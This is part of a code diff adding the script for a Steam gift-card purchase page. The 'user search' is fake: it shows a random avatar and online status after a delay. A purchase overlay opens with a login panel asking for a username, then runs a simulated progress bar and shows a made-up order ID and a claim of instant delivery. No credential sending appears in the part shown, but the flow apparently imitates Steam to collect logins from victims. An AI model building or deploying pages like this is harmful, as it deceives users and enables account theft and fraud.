+  document.querySelectorAll('.gift-card').forEach(c => c.classList.remove('active'));
+  el.classList.add('active');
+  const amt = parseFloat(el.dataset.amount);
+  selectedAmount = amt;
+  selectedImg = el.dataset.img || el.querySelector('img')?.src || selectedImg;
+  document.getElementById('orderAmount').textContent = '$' + amt.toFixed(2);
+  document.getElementById('orderTotal').textContent = '$' + amt.toFixed(2);
+  document.getElementById('orderThumbImg').src = selectedImg;
+  updateBtn();
+}
+
+
+async function searchUser() {
+  const raw = document.getElementById('usernameInput').value.trim().replace(/^@/, '');
+  const errEl = document.getElementById('errorMsg');
+  const box = document.getElementById('userFound');
+  const btn = document.getElementById('searchBtn');
+  errEl.style.display = 'none'; box.classList.remove('show');
+  if (!raw) { errEl.textContent = 'Please enter a Steam username.'; errEl.style.display = 'block'; return; }
+  btn.classList.add('loading'); btn.disabled = true;
+
+  await new Promise(r => setTimeout(r, 900));
+
+  const avatar = STEAM_AVATARS[Math.floor(Math.random() * STEAM_AVATARS.length)];
+  const display = raw.charAt(0).toUpperCase() + raw.slice(1);
+  document.getElementById('userName').textContent = display;
+  const isOnline = Math.random() > 0.5;
+  document.getElementById('userStatus').textContent = isOnline ? 'Online' : 'Offline';
+  document.getElementById('userStatus').style.color = isOnline ? '#5ba32b' : '#8f98a0';
+  document.getElementById('userStatus').style.setProperty('--dot-color', isOnline ? '#5ba32b' : '#666');
+  document.getElementById('orderRecipient').textContent = display;
+  document.getElementById('navUsername').textContent = display;
+  box.classList.add('show'); userFound = true;
+  btn.classList.remove('loading'); btn.disabled = false;
+  updateBtn();
+}
+
+function updateBtn() {
+  document.getElementById('purchaseBtn').disabled = !(userFound && selectedAmount);
+}
+
+function openPayment() {
+  if (!userFound || !selectedAmount) return;
+  document.getElementById('spLogin').classList.add('active');
+  document.getElementById('spProcessing').classList.remove('active');
+  document.getElementById('spSuccess').classList.remove('active');
+  document.getElementById('spOverlay').classList.add('show');
+  document.body.style.overflow = 'hidden';
+}
+
+function goProcessing() {
+  document.getElementById('spLogin').classList.remove('active');
+  document.getElementById('spProcessing').classList.add('active');
+  document.getElementById('spProgressBar').style.width = '0%';
+  let progress = 0;
+  clearInterval(progressInterval);
+  progressInterval = setInterval(() => {
+    progress += (100 - progress) * 0.035;
+    document.getElementById('spProgressBar').style.width = Math.min(progress, 90) + '%';
+  }, 80);
+  setTimeout(() => {
+    clearInterval(progressInterval);
+    document.getElementById('spProgressBar').style.width = '100%';
+    setTimeout(showSuccess, 400);
+  }, 3500);
+}
+
+function showSuccess() {
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('en-US', {month:'short',day:'numeric',year:'numeric'}) + ' at ' + now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
+  const orderId = 'GFT-' + Math.random().toString(36).slice(2,8).toUpperCase();
+  const recipient = document.getElementById('userName').textContent;
+  document.getElementById('spOrderId').textContent = orderId;
+  document.getElementById('spDate').textContent = dateStr;
+  document.getElementById('spRecipient').textContent = recipient;
+  document.getElementById('spTotal').textContent = '$' + selectedAmount.toFixed(2);
+  document.getElementById('spSuccessSub').textContent = recipient + ' will receive this gift card instantly.';
+  document.getElementById('spProcessing').classList.remove('active');
+  document.getElementById('spSuccess').classList.add('active');
+}
+
+function closePayment() {
+  document.getElementById('spOverlay').classList.remove('show');
+  document.body.style.overflow = '';
+  clearInterval(progressInterval);
+  setTimeout(() => {
+    document.getElementById('spLogin').classList.add('active');
+    document.getElementById('spProcessing').classList.remove('active');
+    document.getElementById('spSuccess').classList.remove('active');
+  }, 300);
+}
+
+document.getElementById('spOverlay').addEventListener('click', e => {
+  if (e.target === document.getElementById('spOverlay')) closePayment();
+});
+document.getElementById('usernameInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') searchUser();
+});
+document.getElementById('spUsername').addEventListener('keydown', e => {
+  if (e.key === 'Enter') goProcessing();
+});
+</script>
+</body>
+</html>
